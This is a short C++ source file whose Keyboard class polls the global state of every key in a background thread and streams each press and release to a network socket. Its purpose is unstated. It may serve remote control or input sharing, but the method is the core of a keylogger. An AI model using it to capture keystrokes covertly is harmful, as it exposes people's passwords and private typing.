#include "Keyboard.h"

Keyboard::Keyboard() {

}

void Keyboard::sendKeyboard(SOCKET sock) {
    /*while (1) {
        getBufferKeyInformation(sock);
        Sleep(1);
    }*/

    bool currentKeys[256] = { false };
    memset(currentKeys, 0, sizeof(currentKeys));

    while (1) {
        for (int keyCode = 1; keyCode <= 255; ++keyCode) {
            if (GetAsyncKeyState(keyCode) & 0x8000) {
                if (!currentKeys[keyCode]) {
                    int k = 1; // Key is pressed
                    send(sock, reinterpret_cast<const char*>(&k), sizeof(int), 0);
                    send(sock, reinterpret_cast<const char*>(&keyCode), sizeof(int), 0);
                    currentKeys[keyCode] = true;
                }
            }
            else if (currentKeys[keyCode]) {
                int k = 0; // Key is released
                send(sock, reinterpret_cast<const char*>(&k), sizeof(int), 0);
                send(sock, reinterpret_cast<const char*>(&keyCode), sizeof(int), 0);
                currentKeys[keyCode] = false;
            }
        }

        Sleep(1);
    }
}

void Keyboard::threadKeyboard(SOCKET sock) {
    std::thread keyboardThread(&Keyboard::sendKeyboard, this, sock);
    keyboardThread.detach();
}